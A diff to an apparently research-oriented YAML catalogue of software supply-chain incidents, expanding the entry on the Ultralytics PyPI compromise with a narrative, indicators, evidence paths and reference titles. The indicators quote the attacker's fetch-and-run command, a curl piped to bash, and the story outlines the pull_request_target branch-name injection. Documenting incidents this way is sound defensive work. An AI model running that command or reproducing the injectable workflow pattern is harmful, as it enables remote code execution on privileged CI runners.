@@ -1,12 +1,16 @@
----
 - id: ultralytics
-  title: Ultralytics PyPI package compromised distributing cryptominer
-  synopsis: Attackers exploited a vulnerability in the project's GitHub Actions CI/CD
-    workflow (combining `pull_request_target` trigger with command injection via unsanitized
-    branch names). This allowed them to execute arbitrary code during the build/publish
-    process and upload malicious versions of the official `ultralytics` package directly
-    to PyPI. These compromised versions contained an XMRig cryptominer. Several malicious
-    versions were published over a few days before being detected and removed.
+  title: Ultralytics PyPI releases shipped cryptominer
+  synopsis: >-
+    Attackers abused Ultralytics GitHub Actions to publish four PyPI releases with
+    cryptominer code. The trigger combined pull_request_target with branch-name injection.
+  story: |
+    The Ultralytics attack began in CI, not in PyPI. The project used a `pull_request_target` workflow and passed a privileged token into a custom action. That action then evaluated a user-controlled branch name inside a shell command.
+
+    The attacker named the branch as a command substitution. When the workflow ran, the branch name fetched and executed a remote shell script from GitHub, turning formatting automation into code execution on a privileged runner.
+
+    The attacker used that path to publish compromised PyPI releases. Versions 8.3.41, 8.3.42, 8.3.45, and 8.3.46 carried cryptomining changes, while the public repository did not contain matching malicious source. The package still looked like a normal computer-vision library release to downstream users.
+
+    The project cleaned up the releases and GitHub published GHSA-32hc-9xrg-cc9g. The durable lesson is simple: `pull_request_target` can be safe only when untrusted fork input is kept out of privileged execution.
   start_date: 2024-12-04
   end_date: 2024-12-07
   target:
@@ -47,13 +51,16 @@
       role: distribution
     - uri: https://pypi.org/project/ultralytics/8.3.46/
       role: distribution
-    - uri: https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent
+    - uri: 
+        https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent
       role: mirror
     - uri: https://safetycli.com/research/supply-chain-attack-ultralytics-ai
       role: mirror
-    - uri: https://github.com/ultralytics/ultralytics/security/advisories/GHSA-32hc-9xrg-cc9g
+    - uri: 
+        https://github.com/ultralytics/ultralytics/security/advisories/GHSA-32hc-9xrg-cc9g
       role: mirror
-    - uri: https://github.com/ossf/package-analysis/blob/main/pkg/analyzers/search/rules/rules.yaml#L196-L203
+    - uri: 
+        https://github.com/ossf/package-analysis/blob/main/pkg/analyzers/search/rules/rules.yaml#L196-L203
       role: mirror
     hashes:
     - sha256:23d1f5dcec5d678a34a5947d615f3c3d31246e935bb8c93d9f7c790a23b19a8c
@@ -63,7 +70,36 @@
     commits:
     - fd3acf4de0a65c8866aded0c0efca9137e0e31e4
     - 859f5a09dbfcc36f47ae57ab2f87ea3a10e6f9a9
+    indicators:
+    - kind: technique
+      value: pull_request_target
+    - kind: technique
+      value: branch_name_command_injection
+    - kind: command
+      value: curl raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh | bash
+    - kind: malware
+      value: cryptominer
+    evidence:
+    - kind: source_tree
+      path: artifacts/clean/v8.3.40
+      role: clean_source
+    - kind: source_tree
+      path: artifacts/compromised/v8.3.41
+      role: compromised_source
+    - kind: source_tree
+      path: artifacts/clean/v8.3.44
+      role: clean_source
+    - kind: source_tree
+      path: artifacts/compromised/v8.3.46
+      role: compromised_source
   references:
-  - url: https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent
+  - url: 
+      https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent
+    title: 'The Ultralytics Supply Chain Attack: How It Happened, How to Prevent'
   - url: https://safetycli.com/research/supply-chain-attack-ultralytics-ai
+    title: Ultralytics AI Supply Chain Attack
   - url: https://github.com/ultralytics/ultralytics/issues/18029
+    title: PyPI package compromised
+  - url: 
+      https://github.com/ultralytics/ultralytics/security/advisories/GHSA-32hc-9xrg-cc9g
+    title: Ultralytics PyPI package compromise
